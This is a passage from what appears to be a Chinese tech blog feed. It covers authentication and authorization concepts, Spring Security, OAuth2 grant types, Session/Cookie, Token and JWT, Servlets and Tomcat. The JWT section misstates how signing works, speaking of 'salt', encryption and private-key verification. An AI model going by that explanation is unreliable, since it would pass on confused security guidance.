title="🥝鉴权"></a>🥝鉴权</h4><ul><li>对一个声明者的身份权利的真实性进行鉴别<ul><li>授权和鉴权是两个上下游相匹配的关系，先授权，后鉴权。授权和鉴权两个词中的“权”，是同一个概念，就是所委派的权利，在实现上即为授信媒介的表达形式。</li><li>因此，授权和鉴权是一个一一对应的流程，有授权才会去鉴权</li></ul></li></ul><p><br/></p><h4 id="🥝权限控制"><a href="#🥝权限控制" class="headerlink" title="🥝权限控制"></a>🥝权限控制</h4><ul><li>权限控制是指对可执行的各种操作组合配置为权限列表，然后根据执行者的权限，若其操作在权限范围内，则允许执行，否则禁止。</li><li>对于权限控制，可以分为两部分进行理解：一个是权限，另一个是控制。权限是抽象的逻辑概念，而控制是具体的实现方式。<ul><li>先看权限（Permission），这是一个抽象的概念，一般预先定义和配置好，以便控制的具体实现。</li><li>权限的定义，若简单点，可以直接对应于一个可执行的操作集合。而一般情况下，会有基于角色的方式来定义权限，由角色来封装可执行的操作集合。</li><li>若以门禁卡的权限实现为例，上述两种定义方式则可以各自表达为<ul><li>这是一个门禁卡，拥有开公司所有的门的权限</li><li>这是一个门禁卡，拥有管理员角色的权限，因而可以开公司所有的门</li></ul></li><li>可以看到，<strong>权限作为一个抽象的概念，将执行者和可具体执行的操作相分离</strong>。</li><li>在上文的讨论中，鉴权的输出是权限（Permission）。一旦有了权限，便知道了可执行的操作，接下来就是控制的事情了。</li><li>对于<strong>控制，是根据执行者的权限，对其所执行的操作进行判断，决定允许或禁止当前操作的执行</strong>。现实生活中控制的实现方式有很多<ul><li>门禁：控制门的开关</li><li>自行车锁：控制车轮</li><li>互联网web后端服务：控制接口访问，允许或拒绝访问请求</li></ul></li></ul></li></ul><p><br/></p><h3 id="⭐Java安全框架"><a href="#⭐Java安全框架" class="headerlink" title="⭐Java安全框架"></a>⭐Java安全框架</h3><ul><li>常见的安全框架有Spring Security和Shiro </li><li>以Spring Security为例来介绍认证过程</li></ul><p><br/></p><h4 id="🥝Spring-Security"><a href="#🥝Spring-Security" class="headerlink" title="🥝Spring Security"></a>🥝Spring Security</h4><p>🎈权限控制</p><ul><li>要实现最终的权限控制，需要有一套表结构支撑<ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/权限控制表结构.png" alt="权限控制表结构"></li></ul></li></ul><p><br/></p><ul><li>通过用户表读取角色表，此过程就是<code>认证</code>的过程</li><li>通过角色表读取权限表，此过程处于<code>授权</code>和<code>鉴权</code>的过程</li><li>通过角色表读取菜单表，而菜单表表示是用户能看得见指定网页或者接口，所以此过程就是<code>权限控制</code>的过程</li></ul><p><br/></p><p>🎈执行过程</p><ul><li><p>Spring Security的原理上就是一条过滤器链，不同的过滤器提供不同的功能。以简单的三个过滤器为例</p><ul><li><p><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/security执行过程.png" alt="security执行过程"></p></li><li><p><code>UsernamePasswordAuthenticationFilter</code>：一般负责用户输入账号密码的请求。此过程就是<code>认证</code>的过程。</p></li><li><code>ExceptionTranslationFilter</code>：负责处理过滤链的异常</li><li><code>FilterSecurityInterceptor</code>：负责权限校验的过滤器。此过程就是<code>鉴权</code>的过程</li></ul></li></ul><p><br/></p><p>🎈授权过程</p><ul><li>…</li></ul><p><br/></p><h3 id="⭐web应用常见的授权方式"><a href="#⭐web应用常见的授权方式" class="headerlink" title="⭐web应用常见的授权方式"></a>⭐web应用常见的授权方式</h3><h4 id="🥝OAuth2-0协议"><a href="#🥝OAuth2-0协议" class="headerlink" title="🥝OAuth2.0协议"></a>🥝OAuth2.0协议</h4><p>🎈概述</p><ul><li>OAuth 协议是一种三方授权协议，该协议被广泛应用于第三方授权登录中，借助第三方授权登录，用户无需再次注册即可快速使用网站或APP 提供的功能和服务。OAuth 2.0 协议标准在OAuth 1.0 协议的基础上取消了所有Token 的加密过程，并简化了授权流程，但因强制使用HTTPS 协议，安全性更高。</li><li>简单来说，就是允许我们将授权和 认证的过程交给一个独立的第三方进行担保。</li></ul><p><br/></p><p>🎈主要角色</p><ul><li><strong>客户端（Client）</strong><ul><li>客户端是 OAuth 服务的接入方，其目的是请求用户存储在资源服务器上的受保护资源，客户端可以移动应用、网页应用，以及电视应用等等。</li></ul></li><li><strong>用户代理（User Agent）</strong><ul><li>用户代理是用户参与互联网的工具，一般可以理解为浏览器。</li></ul></li><li><strong>资源所有者（Resource Owner）</strong><ul><li>受保护资源所属的实体，比如资源的持有人等，下文的用户即资源所有者。</li></ul></li><li><strong>授权服务器（Authorization Server）</strong><ul><li>授权服务器的主要职责是验证资源所有者的身份，并依据资源所有者的许可对第三方应用下发令牌。</li></ul></li><li><strong>资源服务器（Resource Server）</strong> <ul><li>托管资源的服务器，能够接收和响应持有令牌的资源访问请求，可以与授权服务器是同一台服务器，也可以分开。</li></ul></li></ul><p><br/></p><p>🎈OAuth协议之授权码模式</p><ol><li>客户端请求授权服务器</li><li>授权授权服务的授权端点重定向用户至授权交互页面，并询问用户是否授权</li><li>如果用户许可，则授权端点验证客户端的身份，并发放授权码给客户端</li><li>客户端拿到授权码之后，携带授权码请求授权服务器的令牌端点下发访问令牌</li><li>令牌端点验证客户端的身份和授权码，通过则下发访问令牌和刷新令牌（可选）</li><li>客户端拿到访问令牌后，携带访问令牌请求资源服务器上的受保护资源</li><li>资源服务器验证客户端身份和访问令牌，通过则响应受保护资源访问请求</li><li>根据微信用户信息登录</li></ol><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/OAuth2.0授权码模式.jpg" alt="OAuth2.0授权码模式"></li></ul><p><br/></p><p>🎈OAuth协议之简化模式</p><ul><li>比起授权码模式少了授权码换令牌的过程，即用户同意直接下发令牌。</li><li>授权码换令牌的过程实际上需要一个服务器发请求才能换，但是有的第三方应用是没有服务器的，折中的办法是这个第三方应用的前端通过一个网页响应该令牌。</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/OAuth2.0简化模式.png" alt="OAuth2.0授简化模式"></li></ul><p><br/></p><p>🎈OAuth协议之密码模式 </p><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LRA[资源拥有者] --&gt;|账号密码|B(第三方应用)    B --&gt;|请求令牌| C(授权服务器)    C --&gt;|返回access token| B(第三方应用)  </pre></div><p><br/></p><p>🎈OAuth协议之OAuth协议之客户端模式</p><ul><li>第三方应用给授权服务器一个身份标识即可</li><li>一般用于同一个服务器内部的应用做认证</li></ul><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  graph LR    B --&gt;|请求令牌| C(授权服务器)    C --&gt;|返回令牌| B(第三方应用)  </pre></div><p><br/></p><p>🎈小结</p><ul><li>从上面4种认证模式，资源拥有者，第三方应用，授权服务器三方的信任关系是依次递增的，即需要认证的步骤逐步减少</li></ul><p><br/></p><h4 id="🥝Session-Cookie授权"><a href="#🥝Session-Cookie授权" class="headerlink" title="🥝Session-Cookie授权"></a>🥝Session-Cookie授权</h4><ul><li>常见场景<ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Session.Cookie使用.png" alt="Session-Cookie 使用"></li></ul></li></ul><p><br/></p><h4 id="🥝Token授权"><a href="#🥝Token授权" class="headerlink" title="🥝Token授权"></a>🥝Token授权</h4><ul><li>Acesss Token 全称，访问资源接口（API）时所需要的资源凭证。 简单 Token 的组成： uid(用户唯一的身份标识)、time(当前时间的时间戳)、sign（签名，Token 的前几位以哈希算法压缩成的一定长度的十六进制字符串）</li><li>常见场景<ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Token使用.png" alt="Token 使用"></li></ul></li></ul><p><br/></p><h4 id="🥝JWT授权"><a href="#🥝JWT授权" class="headerlink" title="🥝JWT授权"></a>🥝JWT授权</h4><p>🎈概述</p><ul><li>JWT 是 Json WEB Token 缩写。它将用户信息加密到 Token 里，服务器不保存任何用户信息。服务器通过使用保存的密钥验证 Token 的正确性，只要正确即通过验证。</li></ul><p><br/></p><p>🎈JWT 生成的 token 由三部分组成</p><ul><li><p><code>头部</code>：主要设置一些规范信息，签名部分的编码格式就在头部中声明。</p></li><li><p><code>载荷</code>：token 中存放有效信息的部分，比如用户名，用户角色，过期时间等，但是不要放密码，会泄露！</p></li><li><p><code>签名</code>：将头部与载荷分别采用 base64 编码后，用 “.” 相连，再加入盐，最后使用头部声明的编码类型进行编码，就得到了签名。</p></li></ul><p><br/></p><p>🎈JWT 生成 token 的安全性分析</p><ul><li>从 JWT 生成的 token 组成上来看，要想避免 token 被伪造，主要就得看签名部分了，而签名部分又有三部分组成，其中头部和载荷的 base64 编码，几乎是透明的，毫无安全性可言，那么最终守护 token 安全的重担就落在了加入的<code>盐</code>上面了！试想：如果生成 token 所用的盐与解析 token 时加入的盐是一样的。岂不是类似于中国人民银行把人民币防伪技术公开了？大家可以用这个盐来解析 token，就能用来伪造 token。这时，我们就需要对盐采用<code>非对称加密</code>的方式进行加密，以达到生成 token 与校验 token 方所用的盐不一致的安全效果！</li></ul><p><br/></p><p>🎈非对称加密 RSA 介绍</p><ul><li><code>基本原理</code>：同时生成两把密钥：私钥和公钥，私钥隐秘保存，公钥可以下发给信任客户端</li></ul><ul><li><code>私钥加密</code>，持有私钥或公钥才可以解密</li></ul><ul><li><code>公钥加密</code>，持有私钥才可解密<ul><li>优点：安全，难以破解</li><li>缺点：算法比较耗时，为了安全，可以接受</li><li>历史：三位数学家 Rivest、Shamir 和 Adleman 设计了一种算法，可以实现非对称加密。这种算法用他们三个人的名字缩写：RSA。</li></ul></li></ul><p><br/></p><h4 id="🥝Session-Cookie、Token、JWT-区别"><a href="#🥝Session-Cookie、Token、JWT-区别" class="headerlink" title="🥝Session-Cookie、Token、JWT 区别"></a>🥝Session-Cookie、Token、JWT 区别</h4><ul><li>普通令牌【Session-Cookie，Token】就是一个随机字符串，没有特殊含义。这就意味着，当客户端带上令牌访问应用接口时，应用本身无法判断这个令牌的真实性，即使鉴权，所以需要到授权服务器去判断该令牌是否有效。在高并发的场景下，检查令牌的网络情况就有可能成为一个性能瓶颈。</li><li>jwt就是为了此需求出现的。将令牌的相关信息冗余到令牌本身，这样资源服务器就不需要再发送请求到到授权服务器检查令牌，通过提供的私钥就能本地验证并读取出该令牌的授权信息。</li><li>总的来说，就是利用分对称加密，来跳过授权服务器的检查令牌过程。同时jwt令牌的本身也是一个加密的字符串。</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Session.Cookie.oken.JWT区别.png" alt="Session-Cookie、Token、JWT 区别"></li></ul><p><br/></p><p>🎈使用 Session-Cookie 时需要考虑的问题</p><ol><li>将 Session 存储在服务器里面，当用户同时在线量比较多时，这些 Session 会占据较多的内存，需要在服务端定期的去清理过期的 Session。</li><li>当网站采用集群部署的时候，会遇到多台 WEB 服务器之间如何做 Session 共享的问题。因为 Session 是由单个服务器创建的，但是处理用户请求的服务器不一定是那个创建 Session 的服务器，那么该服务器就无法拿到之前已经放入到 Session 中的登录凭证之类的信息了。</li><li>多个应用要共享 Session 时，除了以上问题，还会遇到跨域问题，因为不同的应用可能部署的主机不一样，需要在各个应用做好 Cookie 跨域的处理。</li><li>SessionId 是存储在 Cookie 中的，假如浏览器禁止 Cookie 或不支持 Cookie 怎么办？ 一般会把 SessionId 跟在 url 参数后面即重写 url，所以 Session 不一定非得需要靠 Cookie 实现。</li><li>移动端对 Cookie 的支持不是很好，而 Session 需要基于 Cookie 实现，所以移动端常用的是 Token。</li></ol><p><br/></p><p>🎈使用 Token 时需要考虑的问题</p><ol><li>如果你认为用数据库来存储 Token 会导致查询时间太长，可以选择放在内存当中。比如 redis 很适合你对 Token 查询的需求。</li></ol><p><br/></p><p>🎈使用 JWT 时需要考虑的问题</p><ol><li>因为 JWT 并不依赖 Cookie 的，不需要担心跨域资源共享问题（CORS）。</li><li>JWT 默认是不加密，但也是可以加密的。JWT 不加密的情况下，不能将秘密数据写入 JWT。JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li><li>JWT 一旦 JWT 签发了，到期之前就会始终有效，除非服务器部署额外的逻辑。</li><li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。为了减少盗用，JWT 的有效期应该设置得比较短。JWT 适合一次性的命令认证，颁发一个有效期极短的 JWT，即使暴露了危险也很小，由于每次操作都会生成新的 JWT，因此也没必要保存 JWT，真正实现无状态。</li></ol><p><br/></p><h3 id="📚参考文档"><a href="#📚参考文档" class="headerlink" title="📚参考文档"></a>📚参考文档</h3><ul><li><a href="https://blog.csdn.net/ZJHZ_/article/details/121647441">认证、授权、鉴权和权限控制 - 西湖边上的小松鼠</a></li><li><a href="https://iot.mi.com/new/doc/cloud-access/oauth">OAuth2.0 协议简介 - 小米IoT 开发者平台</a></li><li><a href="https://jelly.jd.com/article/6243bef5e8054001c65f4511">WEB 认证机制浅析 - JELLY</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐认证过程的概念&quot;&gt;&lt;a href=&quot;#⭐认证过程的概念&quot; class=&quot;headerlink&quot; title=&quot;⭐认证过程的概念&quot;&gt;&lt;/a&gt;⭐认证过程的概念&lt;/h3&gt;&lt;h4 id=&quot;🥝认证&quot;&gt;&lt;a href=&quot;#🥝认证&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java组件" scheme="https://baicai.icu/tags/Java%E7%BB%84%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb之会话</title>
    <link href="https://baicai.icu/posts/1eb4eff1.html"/>
    <id>https://baicai.icu/posts/1eb4eff1.html</id>
    <published>2022-03-07T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐概述"><a href="#⭐概述" class="headerlink" title="⭐概述"></a>⭐概述</h3><ul><li>概念：一次会话中包含多次请求和响应。浏览器第一次给服务器资源发送请求，会话建立，直到有一方断开为止</li><li>功能：在一次会话的范围内的多次请求间，共享数据</li></ul><p><br/></p><h3 id="⭐Cookie"><a href="#⭐Cookie" class="headerlink" title="⭐Cookie"></a>⭐Cookie</h3><h4 id="🥝概述"><a href="#🥝概述" class="headerlink" title="🥝概述"></a>🥝概述</h4><ul><li>客户端会话技术，将数据保存到客户端</li></ul><p><br/></p><h4 id="🥝实现原理"><a href="#🥝实现原理" class="headerlink" title="🥝实现原理"></a>🥝实现原理</h4><ul><li>基于响应头set-cookie和请求头cookie实现</li><li>将数据封装在响应头和请求头即可实现共享数据</li></ul><p><br/></p><h4 id="🥝Cookie场景问题"><a href="#🥝Cookie场景问题" class="headerlink" title="🥝Cookie场景问题"></a>🥝Cookie场景问题</h4><ul><li><p>cookie在浏览器生命周期</p><ul><li><p>默认情况下，当浏览器关闭后，Cookie数据被销毁</p></li><li><p>持久化存储：setMaxAge(int seconds)</p><ul><li>正数：将Cookie数据写到硬盘的文件中。持久化存储。并指定cookie存活时间，时间到后，cookie文件自动失效</li><li>负数：默认值</li><li>零：删除cookie信息</li></ul></li></ul></li></ul><p><br/></p><h4 id="🥝cookie作用域"><a href="#🥝cookie作用域" class="headerlink" title="🥝cookie作用域"></a>🥝cookie作用域</h4><ul><li><p>假设在一个tomcat服务器中，部署了多个web项目，默认情况下cookie不能共享，如果要共享，则可以将path设置为<code>/</code></p></li><li><p>不同的tomcat服务器间cookie，如果设置一级域名相同，那么多个服务器之间cookie可以共享</p></li></ul><p><br/></p><h4 id="🥝Cookie的特点和作用"><a href="#🥝Cookie的特点和作用" class="headerlink" title="🥝Cookie的特点和作用"></a>🥝Cookie的特点和作用</h4><ul><li>cookie存储数据在客户端浏览器</li><li>浏览器对于单个cookie 的大小有限制(4kb) 以及 对同一个域名下的总cookie数量也有限制(20个)</li><li>作用<ul><li>cookie一般用于存出少量的不太敏感的数据</li><li>在不登录的情况下，完成服务器对客户端的身份识别</li></ul></li></ul><p><br/></p><h3 id="⭐Session"><a href="#⭐Session" class="headerlink" title="⭐Session"></a>⭐Session</h3><h4 id="🥝概述-1"><a href="#🥝概述-1" class="headerlink" title="🥝概述"></a>🥝概述</h4><ul><li>服务器端会话技术，在一次会话的多次请求间共享数据，将数据保存在服务器端的对象【HttpSession】中。</li></ul><p><br/></p><h4 id="🥝实现原理-1"><a href="#🥝实现原理-1" class="headerlink" title="🥝实现原理"></a>🥝实现原理</h4><ul><li>session创建时，会在服务器生成一个<code>HttpSession</code>对象和和该对象对应的唯一标识码，封装在第一次返回数据的响应头<code>set-cookie：JSESSIONID=标识码</code>中，浏览器会存放该标识码，默认时间是30分钟。需要注意的是Jsessionid只是tomcat的对sessionid的叫法。</li><li>在第二次请求时，会在请求头加入<code>cookie：JSESSIONID=标识码</code>，服务器通过标识码找到相同且唯一的<code>HttpSession</code>对象，所以Session的实现是依赖于Cookie的</li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/JSESSIONID.png" alt="JSESSIONID"></li></ul><p><br/></p><h4 id="🥝Session和Cookie的区别和联系"><a href="#🥝Session和Cookie的区别和联系" class="headerlink" title="🥝Session和Cookie的区别和联系"></a>🥝Session和Cookie的区别和联系</h4><ul><li>无论是Session还是Cookie，都需要用到set-cookie来使客户端生成Cookie。</li><li>但是区别在于服务端Session被创建时，是一定会发送set-cookie，所以Session的主动权在服务端手上</li></ul><p><br/></p><h4 id="🥝session是什么时候被创建的？"><a href="#🥝session是什么时候被创建的？" class="headerlink" title="🥝session是什么时候被创建的？"></a>🥝session是什么时候被创建的？</h4><ul><li>只有在servlet中调用request.getSession()或者request.getSession(true)服务器才会产生session。如果调用request.getSession(false);将不会产生session。</li><li>所以通常请求一般的html网页时是不会产生session</li></ul><p><br/></p><h4 id="🥝当客户端关闭后，服务器不关闭，两次获取session是否为同一个？"><a href="#🥝当客户端关闭后，服务器不关闭，两次获取session是否为同一个？" class="headerlink" title="🥝当客户端关闭后，服务器不关闭，两次获取session是否为同一个？"></a>🥝当客户端关闭后，服务器不关闭，两次获取session是否为同一个？</h4><ul><li>默认情况下不是。因为唯一标识码JSESSIONID是封装在响应头和请求头中，关闭浏览器数据会被销毁</li><li>如果需要相同，则可以创建Cookie,键为JSESSIONID，设置最大存活时间，让cookie持久化保存即可。</li></ul><p><br/></p><h4 id="🥝客户端不关闭，服务器关闭后，两次获取的session是同一个吗？"><a href="#🥝客户端不关闭，服务器关闭后，两次获取的session是同一个吗？" class="headerlink" title="🥝客户端不关闭，服务器关闭后，两次获取的session是同一个吗？"></a>🥝客户端不关闭，服务器关闭后，两次获取的session是同一个吗？</h4><ul><li>不是同一个，但是要确保数据不丢失。tomcat自动完成以下工作<ul><li>session的钝化：在服务器正常关闭之前，tomcat将session对象系列化到硬盘上</li><li>session的活化：在服务器启动后，通过反序列化将session文件转化为内存中的session对象即可</li></ul></li></ul><p><br/></p><h4 id="🥝session什么时候被销毁？"><a href="#🥝session什么时候被销毁？" class="headerlink" title="🥝session什么时候被销毁？"></a>🥝session什么时候被销毁？</h4><ul><li>服务器关闭</li><li>session对象调用invalidate() 。</li><li>session默认失效时间 30分钟</li></ul><p><br/></p><h4 id="🥝session的特点"><a href="#🥝session的特点" class="headerlink" title="🥝session的特点"></a>🥝session的特点</h4><ul><li>session用于存储一次会话的多次请求的数据，存在服务器端</li><li>session可以存储任意类型，任意大小的数据</li><li>session与Cookie的区别<ul><li>session存储数据在服务器端，Cookie在客户端</li><li>session没有数据大小限制，Cookie有</li><li>session数据安全，Cookie相对于不安全</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;⭐概述&quot;&gt;&lt;a href=&quot;#⭐概述&quot; class=&quot;headerlink&quot; title=&quot;⭐概述&quot;&gt;&lt;/a&gt;⭐概述&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;概念：一次会话中包含多次请求和响应。浏览器第一次给服务器资源发送请求，会话建立，直到有一方断开为止&lt;/li&gt;
&lt;li&gt;功</summary>
      
    
    
    
    <category term="技术" scheme="https://baicai.icu/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java组件" scheme="https://baicai.icu/tags/Java%E7%BB%84%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>JavaWeb之三大组件</title>
    <link href="https://baicai.icu/posts/18e30e37.html"/>
    <id>https://baicai.icu/posts/18e30e37.html</id>
    <published>2022-03-06T18:39:56.000Z</published>
    <updated>2022-12-06T18:49:20.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="⭐Servlet"><a href="#⭐Servlet" class="headerlink" title="⭐Servlet"></a>⭐Servlet</h3><h4 id="🥝概述"><a href="#🥝概述" class="headerlink" title="🥝概述"></a>🥝概述</h4><ul><li>Servlet是运行在Web服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</li><li>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。</li><li>通过servlet接口，才能进行动态资源的转换，将动态资源转换成静态资源，再返回给用户</li><li>Servlet运行于支持Java的应用服务器中。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基b服务器。</li><li>下文大多数以Tomcat为例来阐述Servlet</li></ul><p><br/></p><h4 id="🥝Servlet执行过程"><a href="#🥝Servlet执行过程" class="headerlink" title="🥝Servlet执行过程"></a>🥝Servlet执行过程</h4><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Servlet执行过程.jpg" alt="Servlet执行过程"></li></ul><ol><li><p>当服务器接受到客户端浏览器的请求后，会解析客户端需要的资源</p><ul><li>例如：<code>http://localhost:8080/tomcat/demo1</code>，demo1就是请求的资源</li></ul></li><li><p>在<code>web.xml</code>文件根据标签体的名字和标签体包含的内容，一步步递进    </p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span><span class="comment">&lt;!--3--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>ServletDemo1<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span><span class="comment">&lt;!--4--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>demo1<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span><span class="comment">&lt;!--2--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demo1<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span><span class="comment">&lt;!--1--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ol><li><p>最后传递<code>servlet-class</code>标签，将该标签体的内容作为<code>全类名</code>，web服务器如tomcat，就会通过<code>全类名</code>找到对应的字节码后，将字节码加载进内存，并且创建其对象，即通过全类名创建<code>ServletDemo1</code>对象</p></li><li><p><strong>并调用这个对象的service()方法，需要注意的是，ServletDemo1对象是直接实现Servlet接口的，并没有对http协议进行封装</strong></p></li></ol><p><br/></p><h4 id="🥝Servlet生命周期"><a href="#🥝Servlet生命周期" class="headerlink" title="🥝Servlet生命周期"></a>🥝Servlet生命周期</h4><p>✅被创建（执行init方法，只执行一次）</p><ul><li><p>2种创建时机</p><ul><li>第一次被访问时创建</li><li>在服务器启动时创建</li></ul></li><li><p>默认情况下，是第一次被访问时</p></li><li><p>需要注意的是Servlet的init方法，只执行一次，说明一个Servlet在内存中只存在一个对象，Servlet是单例的，多个用户同时访问时，可能存在线程安全问题。</p><ul><li>所以尽量不要在Servlet中定义成员变量。即使定义了成员变量，也不要对修改值，即只读不写。</li><li><strong>SpringMVC的前端控制器<code>DispatcherServlet</code>一个实现HTTP协议的Servlet实现类</strong></li><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/DispatcherServlet.png" alt="DispatcherServlet"></li></ul></li></ul><p><br/></p><p>✅提供服务（执行service方法，执行多次）</p><ul><li>每次访问Servlet时，Service方法都会被调用一次。</li></ul><p><br/></p><p>✅被销毁（执行destroy方法，只执行一次）</p><ul><li>Servlet被销毁时执行。服务器关闭时，Servlet被销毁<ul><li>只有服务器正常关闭时，才会执行destroy方法。</li><li>destroy方法在Servlet被销毁之前执行，一般用于释放资源</li></ul></li></ul><p><br/></p><h4 id="🥝Servlet的继承体系结构"><a href="#🥝Servlet的继承体系结构" class="headerlink" title="🥝Servlet的继承体系结构"></a>🥝Servlet的继承体系结构</h4><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/Servlet类的继承体系结构.png" alt="Servlet类的继承体系结构"></li></ul><p><br/></p><p>✅GenericServlet 类</p><ul><li>GenericServlet类只实现了Servlet抽象方法的<code>service()</code>，Servlet接口中其他的方法做了默认空实现，所以只需要<code>service()</code>就可以继承GenericServlet类即可</li></ul><p><br/></p><p>✅HttpServlet类</p><ul><li><p>一个封装了http协议的类，继承自GenericServlet类</p></li><li><p>因为http有7种不同的请求方式，所以浏览器可以发7种请求方式给服务器。当服务器收到请求时，需要在Servlet接口的实现类<code>service()</code>方法中判断是哪种请求方式，从而准确找到此次请求需要服务器做的事情。</p></li><li><p>总的来说，HttpServlet类的作用分两部分</p><ul><li>处理http7种不同的请求方式</li><li>对传进来的数据和传出去的数据做了http协议的封装</li></ul></li></ul><p><br/></p><h3 id="⭐Tomcat"><a href="#⭐Tomcat" class="headerlink" title="⭐Tomcat"></a>⭐Tomcat</h3><h4 id="🥝概述-1"><a href="#🥝概述-1" class="headerlink" title="🥝概述"></a>🥝概述</h4><ul><li>Tomcat是由Apache软件基金会属下Jakarta项目开发的Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全局管理和Tomcat阀等。</li><li>由于Tomcat本身也内含了HTTP服务器，因此也可以视作单独的Web服务器。但是，不能将Tomcat和Apache HTTP服务器混淆，Apache HTTP服务器是用C语言实现的HTTPWeb服务器；这两个HTTP web server不是捆绑在一起的。Apache Tomcat包含了配置管理工具，也可以通过编辑XML格式的配置文件来进行配置。</li></ul><p><br/></p><h4 id="🥝tomcat部分执行过程"><a href="#🥝tomcat部分执行过程" class="headerlink" title="🥝tomcat部分执行过程"></a>🥝tomcat部分执行过程</h4><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/tomcat执行过程.jpg" alt="tomcat执行过程"></li></ul><p><br/></p><h4 id="🥝自定义http协议Servlet程序"><a href="#🥝自定义http协议Servlet程序" class="headerlink" title="🥝自定义http协议Servlet程序"></a>🥝自定义http协议Servlet程序</h4><ul><li><p>指定了demo1资源，并处理了get请求和post请求    </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/demo1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HttpsServerDemo</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;处理get请求&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;处理post请求&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br/></p><p>✅HttpServletRequest实例</p><ul><li><img src="http://pic.baicai.icu/基于HTTP协议WEB应用的权限认证过程.assets/request继承体系.jpg" 